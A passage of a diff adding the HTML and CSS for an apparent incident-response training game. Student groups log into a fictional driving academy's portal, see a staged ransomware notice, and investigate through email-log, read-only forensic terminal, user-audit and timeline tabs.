@@ -1,0 +1,4081 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SafeStart Driving Academy - System Access</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #1f1d3a 40%, #2d1b4e 100%);
+            background-attachment: fixed;
+            min-height: 100vh;
+            color: #e0e0e0;
+            line-height: 1.6;
+        }
+
+        .screen {
+            display: none;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .screen.active {
+            display: block;
+        }
+
+        /* Login Screen */
+        .login-container {
+            max-width: 400px;
+            margin: 100px auto;
+            background: linear-gradient(135deg, #16213e 0%, #1e1b4b 100%);
+            padding: 40px;
+            border-radius: 12px;
+            border: 2px solid rgba(255, 193, 7, 0.55);
+            box-shadow: 0 8px 32px rgba(123, 92, 214, 0.25), 0 0 24px rgba(255, 193, 7, 0.1);
+        }
+
+        .login-logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .login-logo h1 {
+            color: #4a90e2;
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+
+        .login-logo p {
+            color: #888;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #bbb;
+            font-size: 14px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            background: #0f1419;
+            border: 1px solid #333;
+            border-radius: 5px;
+            color: #e0e0e0;
+            font-size: 14px;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #4a90e2;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #4a90e2 0%, #7b5cd6 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 12px rgba(123, 92, 214, 0.25);
+        }
+
+        .btn:hover {
+            background: linear-gradient(135deg, #5aa0f2 0%, #8b6ce6 100%);
+            transform: translateY(-1px);
+            box-shadow: 0 6px 16px rgba(123, 92, 214, 0.4);
+        }
+
+        .error-message {
+            color: #ff6b6b;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+
+        /* Ransomware Screen */
+        #ransomware-screen {
+            background: #000;
+        }
+
+        .ransomware-container {
+            max-width: 900px;
+            margin: 50px auto;
+            background: #0a0000;
+            border: 5px solid #ff0000;
+            padding: 40px;
+            font-family: 'Courier New', monospace;
+            color: #ff0000;
+            position: relative;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.8), inset 0 0 50px rgba(255, 0, 0, 0.2);
+            animation: borderPulse 3s ease-in-out infinite;
+        }
+
+        /* Scanline effect */
+        .ransomware-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                to bottom,
+                transparent 50%,
+                rgba(255, 0, 0, 0.1) 50%
+            );
+            background-size: 100% 4px;
+            pointer-events: none;
+            animation: scanlines 8s linear infinite;
+        }
+
+        /* Glitch overlay */
+        .ransomware-container::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 0, 0, 0.05);
+            pointer-events: none;
+            mix-blend-mode: screen;
+        }
+
+        .ransomware-header {
+            text-align: center;
+            font-size: 36px;
+            font-weight: bold;
+            margin-bottom: 30px;
+            animation: glitchText 4s infinite;
+            text-shadow:
+                0 0 10px #ff0000,
+                0 0 20px #ff0000,
+                0 0 30px #ff0000,
+                2px 2px 0 #00ff00,
+                -2px -2px 0 #0000ff;
+            letter-spacing: 3px;
+        }
+
+        @keyframes screenShake {
+            0%, 100% { transform: translate(0, 0); }
+            10% { transform: translate(-2px, 1px); }
+            20% { transform: translate(2px, -1px); }
+            30% { transform: translate(-1px, 2px); }
+            40% { transform: translate(1px, -2px); }
+            50% { transform: translate(-2px, 1px); }
+            60% { transform: translate(2px, 1px); }
+            70% { transform: translate(-1px, -1px); }
+            80% { transform: translate(1px, 2px); }
+            90% { transform: translate(2px, -2px); }
+        }
+
+        @keyframes borderPulse {
+            0%, 100% {
+                border-color: #ff0000;
+                box-shadow: 0 0 50px rgba(255, 0, 0, 0.8), inset 0 0 50px rgba(255, 0, 0, 0.2);
+            }
+            50% {
+                border-color: #ff6666;
+                box-shadow: 0 0 80px rgba(255, 0, 0, 1), inset 0 0 80px rgba(255, 0, 0, 0.4);
+            }
+        }
+
+        @keyframes glitchBorder {
+            0%, 90%, 100% { clip-path: inset(0); }
+            92% { clip-path: inset(10% 0 70% 0); }
+            94% { clip-path: inset(30% 0 30% 0); }
+            96% { clip-path: inset(80% 0 5% 0); }
+        }
+
+        @keyframes glitchText {
+            0%, 90%, 100% {
+                transform: translate(0);
+                text-shadow:
+                    0 0 10px #ff0000,
+                    0 0 20px #ff0000,
+                    2px 2px 0 #00ff00,
+                    -2px -2px 0 #0000ff;
+            }
+            92% {
+                transform: translate(-5px, 2px);
+                text-shadow:
+                    0 0 10px #ff0000,
+                    5px 0 10px #00ff00,
+                    -5px 0 10px #0000ff;
+            }
+            94% {
+                transform: translate(5px, -2px);
+                text-shadow:
+                    0 0 10px #ff0000,
+                    -5px 0 10px #00ff00,
+                    5px 0 10px #0000ff;
+            }
+        }
+
+        @keyframes urgentBlink {
+            0%, 40%, 100% { opacity: 1; }
+            20% { opacity: 0.7; }
+        }
+
+        @keyframes scanlines {
+            0% { background-position: 0 0; }
+            100% { background-position: 0 100%; }
+        }
+
+        @keyframes glitchOverlay {
+            0%, 80%, 100% { opacity: 0; }
+            81% { opacity: 0.8; transform: translateX(2px); }
+            82% { opacity: 0; }
+            83% { opacity: 0.6; transform: translateX(-2px); }
+            84% { opacity: 0; }
+        }
+
+        .ransomware-content {
+            line-height: 1.8;
+            margin-bottom: 30px;
+            position: relative;
+            z-index: 1;
+        }
+
+        @keyframes contentFlicker {
+            0%, 98%, 100% { opacity: 1; }
+            99% { opacity: 0.95; }
+        }
+
+        .ransomware-section {
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(255, 0, 0, 0.05);
+            border-left: 3px solid #ff0000;
+        }
+
+        .ransomware-section h3 {
+            color: #ffff00;
+            margin-bottom: 10px;
+            font-size: 20px;
+            animation: warningPulse 2s infinite;
+            text-shadow: 0 0 10px #ffff00;
+        }
+
+        @keyframes warningPulse {
+            0%, 100% { color: #ffff00; }
+            50% { color: #ffaa00; }
+        }
+
+        .continue-btn {
+            background: #00ff00;
+            color: #000;
+            padding: 15px 30px;
+            border: 3px solid #00ff00;
+            font-size: 18px;
+            cursor: pointer;
+            font-weight: bold;
+            display: block;
+            margin: 30px auto 0;
+            animation: buttonGlow 1.5s infinite;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            position: relative;
+            z-index: 1;
+        }
+
+        @keyframes buttonGlow {
+            0%, 100% {
+                box-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
+                transform: scale(1);
+            }
+            50% {
+                box-shadow: 0 0 20px #00ff00, 0 0 40px #00ff00;
+                transform: scale(1.05);
+            }
+        }
+
+        .continue-btn:hover {
+            background: #00cc00;
+            box-shadow: 0 0 30px #00ff00, 0 0 60px #00ff00;
+        }
+
+        /* IR Portal */
+        .portal-header {
+            background: linear-gradient(135deg, #16213e 0%, #1e1b4b 100%);
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 2px solid rgba(255, 193, 7, 0.55);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3), 0 0 24px rgba(255, 193, 7, 0.1);
+        }
+
+        .portal-title h2 {
+            color: #4a90e2;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .live-badge {
+            display: inline-flex;
+            align-items: center;
+            background: linear-gradient(135deg, #ff3030 0%, #c00000 100%);
+            color: white;
+            font-size: 12px;
+            font-weight: bold;
+            letter-spacing: 1px;
+            padding: 4px 10px;
+            border-radius: 20px;
+            box-shadow: 0 0 12px rgba(255, 48, 48, 0.6);
+            animation: livePulse 1.6s ease-in-out infinite;
+        }
+
+        @keyframes livePulse {
+            0%, 100% { box-shadow: 0 0 12px rgba(255, 48, 48, 0.6); }
+            50%      { box-shadow: 0 0 22px rgba(255, 48, 48, 0.95); }
+        }
+
+        .portal-title p {
+            color: #888;
+            font-size: 14px;
+        }
+
+        .score-display {
+            text-align: right;
+        }
+
+        .score-display .score {
+            font-size: 36px;
+            background: linear-gradient(135deg, #4ade80 0%, #22d3ee 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: bold;
+            text-shadow: 0 0 20px rgba(74, 222, 128, 0.3);
+        }
+
+        .score-display .label {
+            color: #888;
+            font-size: 14px;
+        }
+
+        .tabs {
+            background: linear-gradient(135deg, #16213e 0%, #1e1b4b 100%);
+            padding: 15px;
+            border-radius: 12px 12px 0 0;
+            display: flex;
+            gap: 10px;
+            border: 2px solid rgba(255, 193, 7, 0.55);
+            border-bottom: none;
+        }
+
+        .tab-btn {
+            padding: 10px 20px;
+            background: rgba(15, 20, 25, 0.6);
+            color: #a8a8c0;
+            border: 2px solid rgba(255, 193, 7, 0.65);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 500;
+        }
+
+        .tab-btn:hover {
+            background: rgba(123, 92, 214, 0.2);
+            color: #e0e0e0;
+            transform: translateY(-1px);
+        }
+
+        .tab-btn.active {
+            background: linear-gradient(135deg, #4a90e2 0%, #7b5cd6 100%);
+            color: white;
+            box-shadow: 0 4px 12px rgba(123, 92, 214, 0.4);
+        }
+
+        .tab-content {
+            background: linear-gradient(135deg, #16213e 0%, #1e1b4b 100%);
+            padding: 20px;
+            border-radius: 0 0 12px 12px;
+            min-height: 500px;
+            border: 2px solid rgba(255, 193, 7, 0.55);
+            border-top: none;
+        }
+
+        .tab-panel {
+            display: none;
+        }
+
+        .tab-panel.active {
+            display: block;
+        }
+
+        /* Email Interface */
+        .email-list {
+            background: #0f1419;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+
+        .email-item {
+            padding: 15px;
+            border-bottom: 1px solid #333;
+            cursor: pointer;
+            transition: background 0.2s;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .email-item:hover {
+            background: #1a2332;
+        }
+
+        .email-item.read {
+            opacity: 0.7;
+        }
+
+        .email-item-main {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .email-item-status {
+            flex-shrink: 0;
+            font-size: 12px;
+            font-weight: 600;
+            padding: 4px 10px;
+            border-radius: 4px;
+            white-space: nowrap;
+        }
+
+        .email-item-status.analyzed {
+            background: rgba(74, 222, 128, 0.15);
+            border: 1px solid #4ade80;
+            color: #4ade80;
+        }
+
+        .email-item-status.pending {
+            background: rgba(136, 136, 136, 0.1);
+            border: 1px solid #555;
+            color: #888;
+        }
+
+        .email-item .email-from {
+            font-weight: bold;
+            color: #4a90e2;
+            margin-bottom: 5px;
+        }
+
+        .email-item .email-subject {
+            color: #e0e0e0;
+            margin-bottom: 5px;
+        }
+
+        .email-item .email-date {
+            color: #888;
+            font-size: 12px;
+        }
+
+        .email-detail {
+            display: none;
+            background: #0f1419;
+            padding: 20px;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+
+        .email-detail.active {
+            display: block;
+        }
+
+        .email-header {
+            border-bottom: 1px solid #333;
+            padding-bottom: 15px;
+            margin-bottom: 15px;
+        }
+
+        .email-header-row {
+            margin-bottom: 5px;
+            color: #888;
+        }
+
+        .email-header-row strong {
+            color: #e0e0e0;
+        }
+
+        .email-body {
+            line-height: 1.8;
+            white-space: pre-wrap;
+        }
+
+        .back-btn {
+            padding: 8px 16px;
+            background: #333;
+            color: #e0e0e0;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+
+        .back-btn:hover {
+            background: #444;
+        }
+
+        /* Terminal */
+        .terminal-container {
+            background: #000;
+            border-radius: 5px;
+            padding: 20px;
+            font-family: 'Courier New', monospace;
+            min-height: 500px;
+        }
+
+        .terminal-output {
+            margin-bottom: 20px;
+            color: #22d3ee;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .terminal-input-line {
+            display: flex;
+            align-items: center;
+        }
+
+        .terminal-prompt {
+            color: #22d3ee;
+            margin-right: 10px;
+        }
+
+        .terminal-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #22d3ee;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            outline: none;
+            caret-color: #ffffff;
+        }
+
+        .terminal-container {
+            cursor: text;
+        }
+
+        .command-output {
+            margin: 10px 0;
+            padding-left: 10px;
+        }
+
+        .error-output {
+            color: #ff6b6b;
+        }
+
+        /* User Audit Table */
+        .user-audit-table {
+            width: 100%;
+            background: #0f1419;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+
+        .user-audit-table table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .user-audit-table th {
+            background: #1a2332;
+            padding: 12px;
+            text-align: left;
+            color: #4a90e2;
+            font-weight: bold;
+        }
+
+        .user-audit-table td {
+            padding: 12px;
+            border-bottom: 1px solid #333;
+        }
+
+        .user-audit-table tbody tr {
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .user-audit-table tbody tr:hover {
+            background: #1a2332;
+        }
+
+        .user-audit-table tbody tr.identified-correct {
+            background: rgba(74, 222, 128, 0.15);
+            border-left: 4px solid #4ade80;
+        }
+
+        .user-audit-table tbody tr.identified-incorrect {
+            background: rgba(255, 107, 107, 0.15);
+            border-left: 4px solid #ff6b6b;
+        }
+
+        .user-audit-table tbody tr.already-checked {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .warning-badge {
+            background: #ff6b6b;
+            color: white;
+            padding: 2px 8px;
+            border-radius: 3px;
+            font-size: 12px;
+        }
+
+        .suspicious-row {
+            background: #3d1f1f !important;
+        }
+
+        /* Evidence Board */
+        .evidence-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 15px;
+        }
+
+        .evidence-card {
+            background: #0f1419;
+            padding: 15px;
+            border-radius: 5px;
+            border-left: 4px solid #333;
+            opacity: 0.4;
+        }
+
+        .evidence-card.discovered {
+            opacity: 1;
+            border-left-color: #4ade80;
+        }
+
+        .evidence-card-title {
+            color: #4a90e2;
+            font-weight: bold;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .evidence-points {
+            color: #4ade80;
+            font-size: 14px;
+        }
+
+        .evidence-card-description {
+            color: #bbb;
+            font-size: 14px;
+        }
+
+        .checkmark {
+            color: #4ade80;
+            font-size: 20px;
+            display: none;
+        }
+
+        .evidence-card.discovered .checkmark {
+            display: inline;
+        }
+
+        /* Timeline Builder */
+        .timeline-builder {
+            margin-top: 20px;
+        }
+
+        .timeline-events {
+            background: #0f1419;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+
+        .timeline-item {
+            background: #1a2332;
+            padding: 12px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            cursor: move;
+            border-left: 4px solid #4a90e2;
+        }
+
+        .timeline-item.dragging {
+            opacity: 0.5;
+        }
+
+        .timeline-drop-zone {
+            background: #0f1419;
+            padding: 20px;
+            border-radius: 5px;
+            border: 2px dashed #333;
+            min-height: 200px;
+        }
+
+        .timeline-slot {
+            display: flex;
+            align-items: center;
+            background: #1a2332;
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            border: 2px solid #333;
+            min-height: 60px;
+            position: relative;
+        }
+
+        .timeline-slot.drag-over {
+            border-color: #4a90e2;
+            background: #2a3342;
+        }
+
+        .slot-number {
+            font-size: 24px;
+            font-weight: bold;
+            color: #4a90e2;
+            min-width: 40px;
+            text-align: center;
+            margin-right: 15px;
+            padding-right: 15px;
+            border-right: 2px solid #333;
+        }
+
+        .slot-placeholder {
+            color: #666;
+            font-style: italic;
+            flex: 1;
+        }
+
+        .timeline-slot .timeline-item {
+            margin: 0;
+            flex: 1;
+        }
+
+        .submit-timeline-btn {
+            margin-top: 20px;
+            padding: 12px 30px;
+            background: #4ade80;
+            color: #000;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .submit-timeline-btn:hover {
+            background: #3bc76d;
+        }
+
+        /* IR Plan */
+        .ir-plan-options {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .ir-plan-option {
+            background: #0f1419;
+            padding: 20px;
+            border-radius: 5px;
+            border: 2px solid #333;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .ir-plan-option:hover {
+            border-color: #4a90e2;
+        }
+
+        .ir-plan-option.selected {
+            border-color: #4ade80;
+            background: #1a2f1f;
+        }
+
+        .ir-plan-option h3 {
+            color: #4a90e2;
+            margin-bottom: 10px;
+        }
+
+        .submit-ir-btn {
+            margin-top: 20px;
+            padding: 12px 30px;
+            background: #4ade80;
+            color: #000;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .submit-ir-btn:hover {
+            background: #3bc76d;
+        }
+
+        /* Results */
+        .results-container {
+            max-width: 800px;
+            margin: 50px auto;
+            background: #16213e;
+            padding: 40px;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        .final-score {
+            font-size: 72px;
+            color: #4ade80;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+
+        .results-breakdown {
+            text-align: left;
+            margin: 30px 0;
+        }
+
+        .results-breakdown-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px;
+            border-bottom: 1px solid #333;
+        }
+
+        /* Utility */
+        .hint-box {
+            background: #3d1f1f;
+            border-left: 4px solid #ff6b6b;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+            display: none;
+        }
+
+        .hint-box.visible {
+            display: block;
+        }
+
+        .hint-box strong {
+            color: #ff6b6b;
+        }
+
+        /* Quiz Modal */
+        .quiz-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .quiz-modal.active {
+            display: flex;
+        }
+
+        .quiz-content {
+            background: #16213e;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 600px;
+            width: 90%;
+            border: 2px solid #4a90e2;
+        }
+
+        .quiz-header {
+            color: #4a90e2;
+            font-size: 20px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .quiz-question {
+            color: #e0e0e0;
+            font-size: 16px;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        .quiz-options {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .quiz-option {
+            background: #0f1419;
+            padding: 15px;
+            border-radius: 5px;
+            border: 2px solid #333;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .quiz-option:hover {
+            border-color: #4a90e2;
+        }
+
+        .quiz-option.selected {
+            border-color: #4a90e2;
+            background: #1a2f3a;
+        }
+
+        .quiz-option.correct {
+            border-color: #4ade80;
+            background: #1a2f1f;
+        }
+
+        .quiz-option.incorrect {
+            border-color: #ff6b6b;
+            background: #3d1f1f;
+        }
+
+        .quiz-feedback {
+            background: #0f1419;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 15px;
+            display: none;
+        }
+
+        .quiz-feedback.visible {
+            display: block;
+        }
+
+        .quiz-feedback.correct {
+            border-left: 4px solid #4ade80;
+        }
+
+        .quiz-feedback.incorrect {
+            border-left: 4px solid #ff6b6b;
+        }
+
+        .quiz-submit-btn {
+            padding: 12px 30px;
+            background: #4a90e2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .quiz-submit-btn:hover {
+            background: #357abd;
+        }
+
+        .quiz-continue-btn {
+            padding: 12px 30px;
+            background: #4ade80;
+            color: #000;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .quiz-continue-btn:hover {
+            background: #3bc76d;
+        }
+
+        /* Email Analysis Modal */
+        .email-analysis-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .email-analysis-modal.active {
+            display: flex;
+        }
+
+        .email-analysis-content {
+            background: #16213e;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 600px;
+            width: 90%;
+            border: 2px solid #4a90e2;
+        }
+
+        .analyze-email-btn {
+            padding: 12px 24px;
+            background: #4a90e2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        .analyze-email-btn:hover {
+            background: #357abd;
+        }
+
+        .back-to-email-btn {
+            padding: 8px 16px;
+            background: #333;
+            color: #e0e0e0;
+            border: 1px solid #555;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-bottom: 15px;
+            display: block;
+        }
+
+        .back-to-email-btn:hover {
+            background: #444;
+            border-color: #4a90e2;
+        }
+    </style>
+</head>
+<body>
+
+<!-- Login Screen -->
+<div id="login-screen" class="screen active">
+    <div class="login-container">
+        <div class="login-logo">
+            <div style="font-size: 48px; margin-bottom: 15px;">🚗</div>
+            <h1>SafeStart Driving Academy</h1>
+            <p>System Portal Access</p>
+        </div>
+        <form id="login-form">
+            <div class="form-group">
+                <label for="username">Group ID</label>
+                <input type="text" id="username" placeholder="Enter group ID (e.g., group1)" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Enter password" required>
+            </div>
+            <button type="submit" class="btn">Login</button>
+            <div class="error-message" id="login-error">Invalid credentials. Please try again.</div>
+        </form>
+    </div>
+</div>
+
+<!-- Ransomware Screen -->
+<div id="ransomware-screen" class="screen">
+    <div class="ransomware-container">
+        <div class="ransomware-header">
+            ⚠️ ⚠️ ⚠️  SYSTEM COMPROMISED  ⚠️ ⚠️ ⚠️
+        </div>
+        <div style="text-align: center; font-size: 24px; margin-bottom: 20px; color: #ff0000;">
+            >>> PRODUCTION SYSTEMS ENCRYPTED <<<
+        </div>
+        <div class="ransomware-content">
+            <div class="ransomware-section">
+                <p style="font-size: 16px;">Your systems are encrypted and we have your data. Pay $15,000 in Bitcoin within 2 hours or it leaks.</p>
+                <p style="color: #ff6666; margin-top: 10px;">⏰ TIME REMAINING: <span id="ransom-countdown">02:00:00</span></p>
+            </div>
+
+            <div class="ransomware-section" style="background: rgba(74, 222, 128, 0.08); border-left: 3px solid #4ade80;">
+                <p style="color: #e0e0e0; font-size: 14px;">📦 IT notice: off-site backups are intact. A read-only forensic environment is up for investigation.</p>
+            </div>
+
+            <div class="ransomware-section" style="background: rgba(255, 255, 0, 0.1); border: 2px solid #ffff00;">
+                <p style="font-size: 14px; color: #ffff00;">💡 Prove how we got in — rebuild the attack timeline and IR plan — and we'll hand over the key for free.</p>
+            </div>
+        </div>
+
+        <div style="text-align: center; margin-top: 30px; padding: 20px; background: rgba(0, 255, 0, 0.1); border: 2px solid #00ff00;">
+            <p style="color: #00ff00; font-size: 16px; margin-bottom: 15px;">Access forensic systems to investigate:</p>
+            <button class="continue-btn" onclick="showIRPortal()" style="background: #00ff00; border-color: #00ff00;">Begin Investigation</button>
+        </div>
+    </div>
+</div>
+
+<!-- IR Portal Screen -->
+<div id="portal-screen" class="screen">
+    <div class="portal-header">
+        <div class="portal-title">
+            <h2>
+                <span class="live-badge">🔴 LIVE</span>
+                SAFESTART INCIDENT RESPONSE PORTAL
+            </h2>
+            <p>Incident ID: <span style="color:#ffb800;font-weight:bold;">2026-03-24-RANSOMWARE</span> | <span style="color:#ff4444;font-weight:bold;">⚠️ Systems Encrypted</span> | <span style="color:#ff6666;font-weight:bold;">⏰ <span id="portal-countdown">02:00:00</span></span></p>
+            <p style="color: #ffd54a; font-size: 13px; margin-top: 5px;">Mission: Prove you understand the attack by building the complete timeline and submitting an incident response plan</p>
+        </div>
+        <div style="display: flex; flex-direction: column; align-items: flex-end; gap: 8px;">
+            <div class="score-display">
+                <div class="score" id="current-score">0</div>
+                <div class="label">Points</div>
+            </div>
+            <button onclick="resetProgress()" style="background: transparent; border: 1px solid #ff6666; color: #ff6666; padding: 4px 10px; border-radius: 4px; font-size: 11px; cursor: pointer;">Reset Progress</button>
+        </div>
+    </div>
+
+    <div class="tabs">
+        <button class="tab-btn active" onclick="switchTab('emails')">📧 Email Logs</button>
+        <button class="tab-btn" onclick="switchTab('terminal')">💻 Terminal</button>
+        <button class="tab-btn" onclick="switchTab('users')">👥 User Audit</button>
+        <button class="tab-btn" onclick="switchTab('timeline')">📅 Timeline Builder</button>
+        <button class="tab-btn" onclick="switchTab('irplan')">📋 IR Plan</button>
+    </div>
+
+    <div class="tab-content">
+        <!-- Email Tab -->
+        <div id="emails-tab" class="tab-panel active">
+            <h3>Email Archive (Google Workspace)</h3>
+            <p style="color: #888; margin-bottom: 10px;">Systems restored from backup. Email archive accessible for investigation.</p>
+            <div style="background: rgba(255, 193, 7, 0.08); border: 2px solid rgba(255, 193, 7, 0.65); border-radius: 6px; padding: 12px 16px; margin-bottom: 20px; font-size: 13px; color: #b0c8e8;">
+                📋 <strong>Instructions:</strong> Open and analyze <em>every</em> email — mark each one as phishing or legitimate. Every email is worth points, even the ones that seem routine. You may need evidence from multiple emails to build the full picture.
+            </div>
+
+            <div class="email-list" id="email-list">
+                <!-- Emails will be populated by JavaScript -->
+            </div>
+
+            <div class="email-detail" id="email-detail">
+                <button class="back-btn" onclick="closeEmail()">← Back to List</button>
+                <div id="email-detail-content"></div>
+            </div>
+        </div>
+
+        <!-- Terminal Tab -->
+        <div id="terminal-tab" class="tab-panel">
+            <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 10px; gap: 16px;">
+                <div>
+                    <h3 style="margin: 0;">Forensic System Terminal</h3>
+                    <p style="color: #888; margin-top: 3px; font-size: 13px;">Read-only forensic snapshot. Navigate and investigate system files.</p>
+                </div>
+                <div style="background: #0f1419; border: 1px solid #333; border-radius: 6px; padding: 8px 12px; font-family: 'Courier New', monospace; font-size: 11px; min-width: 200px;">
+                    <div style="color: #4a90e2; font-weight: bold; margin-bottom: 4px; font-size: 11px;">Command Reference</div>
+                    <div style="color: #888; line-height: 1.5;">
+                        <span style="color:#22d3ee;">ls</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; list files &amp; folders<br>
+                        <span style="color:#22d3ee;">ls -la</span> &nbsp;&nbsp;&nbsp; show hidden files<br>
+                        <span style="color:#22d3ee;">cd [dir]</span> &nbsp;&nbsp; enter a directory<br>
+                        <span style="color:#22d3ee;">cd ..</span> &nbsp;&nbsp;&nbsp;&nbsp; go back up<br>
+                        <span style="color:#22d3ee;">cat [file]</span> &nbsp;read a file<br>
+                        <span style="color:#22d3ee;">grep [term] [file]</span> &nbsp;search<br>
+                        <span style="color:#22d3ee;">clear</span> &nbsp;&nbsp;&nbsp;&nbsp; clear screen
+                    </div>
+                </div>
+            </div>
+
+            <div class="terminal-container">
+                <div class="terminal-output" id="terminal-output">SafeStart Forensic Terminal v1.0
+Forensic snapshot loaded. You are investigating as read-only user 'forensic'.
+
+</div>
+                <div class="terminal-input-line">
+                    <span class="terminal-prompt" id="terminal-prompt">forensic@safestart:~$</span>
+                    <input type="text" class="terminal-input" id="terminal-input" autocomplete="off">
+                </div>
+            </div>
+        </div>
+
+        <!-- User Audit Tab -->
+        <div id="users-tab" class="tab-panel">
+            <h3>User Account Audit</h3>
+            <p style="color: #888; margin-bottom: 10px;">Complete list of system accounts and permissions at time of breach.</p>
+
+            <div style="background: rgba(74, 144, 226, 0.1); border-left: 4px solid #4a90e2; padding: 15px; margin-bottom: 20px; border-radius: 5px;">
+                <p style="color: #4a90e2; font-weight: bold; margin-bottom: 5px;">🔍 Your Task:</p>
+                <p style="color: #e0e0e0; font-size: 14px;">Click on any user accounts that look suspicious to you. You'll be asked to identify what makes them suspicious.</p>
+                <p style="color: #888; font-size: 13px; margin-top: 5px;">Note: Too many incorrect guesses will reduce your points. Use the terminal to help you complete this section.</p>
+                <div id="audit-progress" style="margin-top: 10px; color: #4ade80; font-size: 14px;"></div>
+            </div>
+
+            <div class="user-audit-table">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Username</th>
+                            <th>Full Name</th>
+                            <th>Role</th>
+                            <th>Permissions</th>
+                            <th>Last Login</th>
+                            <th>IP Address</th>
+                            <th>MFA</th>
+                        </tr>
+                    </thead>
+                    <tbody id="user-table-body">
+                        <!-- Will be populated by JavaScript -->
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- Timeline Builder Tab -->
+        <div id="timeline-tab" class="tab-panel">
+            <h3>Reconstruct the Attack Timeline</h3>
